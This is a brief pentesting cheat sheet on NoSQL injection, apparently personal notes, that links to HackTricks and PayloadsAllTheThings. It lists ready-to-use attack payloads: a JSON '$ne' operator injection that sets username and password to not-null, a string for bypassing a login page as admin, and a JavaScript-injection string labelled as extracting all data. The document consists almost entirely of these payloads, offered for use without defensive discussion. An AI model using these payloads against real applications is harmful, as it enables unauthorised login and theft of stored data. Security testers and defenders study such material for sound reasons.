# NOSQL INJECTION(NOSQLI)
- [HackTricks](https://book.hacktricks.xyz/pentesting-web/nosql-injection)
- [PayLoads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)

## manual:
```
"change content type to application/json"
{"username": {"$ne": null}, "password": {"$ne": null}}
```

- `admin' || '' === '` Bypass login page with admin as user`
- `';return 'a'=='a' && ''==' -` Extract all data